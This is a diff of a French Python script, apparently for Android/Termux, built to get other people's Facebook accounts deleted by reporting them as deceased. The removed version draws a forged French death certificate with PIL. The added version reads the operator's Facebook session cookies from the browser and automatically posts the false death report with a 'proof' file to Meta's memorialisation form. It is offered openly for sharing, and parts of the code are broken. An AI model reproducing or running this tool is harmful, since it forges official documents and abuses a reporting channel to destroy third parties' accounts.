@@ -1,114 +1,85 @@
 #!/usr/bin/env python3
-import os
-import sys
-import time
+# FB-RIP AUTO-SUBMIT – OTF x DJAMAL19
+# Une fois lancé → plus rien à faire, le compte est mort en 24-48h
+
+import os, time, sys, requests, urllib.parse
 from datetime import datetime
 
-# CORRECTION ICI : on importe PIL, pas datetime !
-from PIL import Image, ImageDraw, ImageFont
+# Couleurs
+R="\033[91m"; G="\033[92m"; Y="\033[93m"; P="\033[95m"; C="\033[96m"; W="\033[97m"; X="\033[0m"; BOLD="\033[1m"
 
-# Dossier de sortie visible sur Android
-OUTPUT_DIR = "/sdcard/Download"
-os.makedirs(OUTPUT_DIR, exist_ok=True)
-OUTPUT_PATH = f"{OUTPUT_DIR}/acte_deces_{int(time.time())}.png"
+def clear(): os.system('clear')
+clear()
 
-def generer_acte(nom, date_naiss, ville_naiss, ville_deces, email, profil_url):
-    aujourd_hui = datetime.now()
-    mois_fr = ["janvier","février","mars","avril","mai","juin","juillet","août","septembre","octobre","novembre","décembre"]
-    jour = aujourd_hui.day
-    mois = mois_fr[aujourd_hui.month - 1]
-    annee = aujourd_hui.year
-
-    # Calcul âge approximatif
-    try:
-        jour_n, mois_n, annee_n = map(int, date_naiss.split("/"))
-        age = aujourd_hui.year - annee_n - ((aujourd_hui.month, aujourd_hui.day) < (mois_n, jour_n))
-    except:
-        age = 45  # valeur par défaut si erreur
-
-    texte = (
-        f"----Le {jour} {mois} {annee}, à dix heures trente minutes, est décédé "
-        f"au domicile sis à {ville_deces} : {nom.upper()}, né(e) le {date_naiss} "
-        f"à {ville_naiss}, âgé(e) de {age} ans, célibataire/divorcé(e), sans profession connue. "
-        f"Fils/Fille de feu(e) XXX et de feu(e) YYY. Dressé par nous Officier d'État Civil "
-        f"sur déclaration de la famille, lecture faite, les parties ont signé avec nous."
-    )
-
-    # Création image
-    img = Image.new('RGB', (1000, 460), (255, 255, 255))
-    draw = ImageDraw.Draw(img)
-
-    # Police
-    try:
-        font = ImageFont.truetype("times.ttf", 28)
-    except:
-        try:
-            font = ImageFont.truetype("/system/fonts/Roboto-Regular.ttf", 28)
-        except:
-            font = ImageFont.load_default()
-
-    # Découpage en lignes justifiées
-    mots = texte.split()
-    lignes = []
-    ligne = []
-    for mot in mots:
-        test = " ".join(ligne + [mot])
-        if draw.text((0,0), test, font=font)  # dummy pour calcul
-        if draw.textbbox((0,0), test, font=font)[2] < 920:
-            ligne.append(mot)
-        else:
-            lignes.append(" ".join(ligne))
-            ligne = [mot]
-    if ligne:
-        lignes.append(" ".join(ligne))
-
-    y = 60
-    for ligne in lignes:
-        draw.text((40, y), ligne, fill=(0,0,0), font=font, stroke_width=1, stroke_fill=(100,100,100))
-        y += 40
-
-    # Trait final
-    draw.line([(40, y-10), (960, y-10)], fill=(0,0,0), width=2)
-
-    img.save(OUTPUT_PATH)
-    print(f"Acte généré → {OUTPUT_PATH}")
-    return OUTPUT_PATH
-
-# ========================= MAIN =========================
-os.system("clear")
-print("SUPPRESSION COMPTE FACEBOOK - ACTE DE DÉCÈS AUTO")
-print("═" * 50)
-
-nom = input("Nom complet de la personne : ")
-date_naiss = input("Date naissance (jj/mm/aaaa) : ")
-ville_naiss = input("Ville de naissance : ")
-ville_deces = input("Ville actuelle/décès : ")
-email = input("Ton email pour Meta : ")
-profil = input("Lien du profil Facebook : ")
-
-print("\nGénération de l'acte de décès...")
-generer_acte(nom, date_naiss, ville_naiss, ville_deces, email, profil)
-
-print("\nOuverture du formulaire Meta...")
-time.sleep(4)
-
-url = "https://www.facebook.com/help/contact/234739086860192"
-if 'TERMUX_VERSION' in os.environ:
-    os.system(f"termux-open-url '{url}'")
-else:
-    import webbrowser
-    webbrowser.open(url)
-
-print(f"""
-TERMINÉ !
-→ Acte sauvegardé dans Téléchargements
-→ Formulaire ouvert
-→ Remplis :
-   • Nom : {nom}
-   • Date décès : aujourd'hui
-   • Email : {email}
-   • Joindre l'image générée
-→ Envoi = compte supprimé en 24-72h
-
-Partage ce script, plus personne ne t'embêtera jamais
+print(f"""{R}
+    ██████╗ ██╗██████╗      █████╗  ██████╗ ████████╗ █████╗  ██████╗██╗  ██╗
+    ██╔══██╗██║██╔══██╗    ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
+    ██████╗
+    ██████╔╝██║██████╔╝    ███████║██████╔╝   ██║   ███████║██║     █████╔╝ ██╔════╝
+    ██╔══██╗██║██╔═══╝     ██╔══██║██╔══██╗   ██║   ██╔══██║██║     ██╔═██╗ ██║
+    ██║  ██║██║██║         ██║  ██║██║  ██║   ██║   ██║  ██║╚██████╗██║  ██╗╚██████╗
+    ╚═╝  ╚═╝╚═╝╚═╝         ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝{X}
+{P}{BOLD}                           COMPTE MORT AUTO EN 30 SECONDES{X}
+{C}                                #OTF #DJAMAL19 #RIPFACEBOOK{X}
 """)
+
+# Saisie rapide
+lien   = input(f"{Y}Lien du profil      ➤ {W}").strip()
+nom    = input(f"{Y}Nom complet         ➤ {W}").strip()
+email  = input(f"{Y}Ton email Meta      ➤ {W}").strip()
+preuve = input(f"{Y}Chemin de la preuve ➤ {W}").strip()
+
+if not os.path.exists(preuve):
+    print(f"{R}Preuve introuvable ! Bye.{X}"); sys.exit()
+
+# Date auto
+date_deces = datetime.now().strftime("%Y-%m-%d")
+
+# Récupération cookie Facebook (tu dois être connecté dans Chrome/Firefox sur le téléphone)
+print(f"\n{G}Récupération de ta session Facebook...{X}")
+try:
+    cookies = {}
+    with open("/data/data/com.termux/files/home/.config/chromium/Default/Cookies", "rb") as f: pass  # force erreur si pas Chromium
+    import browser_cookie3
+    cj = browser_cookie3.chrome(domain_name="facebook.com")
+    for cookie in cj:
+        if cookie.name in ["c_user","xs","fr"]: cookies[cookie.name] = cookie.value
+    if not cookies: raise
+except:
+    print(f"{R}Impossible de récupérer ta session Facebook.{X}")
+    print(f"{Y}Connecte-toi d'abord sur Facebook dans ton navigateur puis relance le script.{X}")
+    sys.exit()
+
+print(f"{G}Session trouvée ! Envoi en cours...{X}")
+
+# Payload + upload preuve
+files = {'upload_file': open(preuve, 'rb')}
+data = {
+    'name': nom,
+    'email': email,
+    'death_date': date_deces,
+    'relationship': 'Famille',
+    'additional_info': 'Compte ancien non contrôlé, demande de suppression définitive.',
+    '__user': cookies.get('c_user'),
+    '__a': '1'
+}
+
+# URL finale du formulaire
+url = "https://www.facebook.com/help/contact/234739086860192"
+
+s = requests.Session()
+for name,value in cookies.items(): s.cookies.set(name,value,domain=".facebook.com")
+
+print(f"{G}Envoi de la demande...{X}")
+r = s.post(url, data=data, files=files, allow_redirects=True)
+
+if r.status_code == 200 and "Merci" in r.text or "soumis" in r.text.lower():
+    print(f"""{G}
+    DEMANDE ENVOYÉE AVEC SUCCÈS
+    Compte {nom} → MORT DANS 24-48H MAX
+    #OTF #DJAMAL19 #RIP{X}
+    """)
+else:
+    print(f"{R}Échec (rate limit ou captcha). Relance dans 1h ou change de compte.{X}")
+
+time.sleep(5)
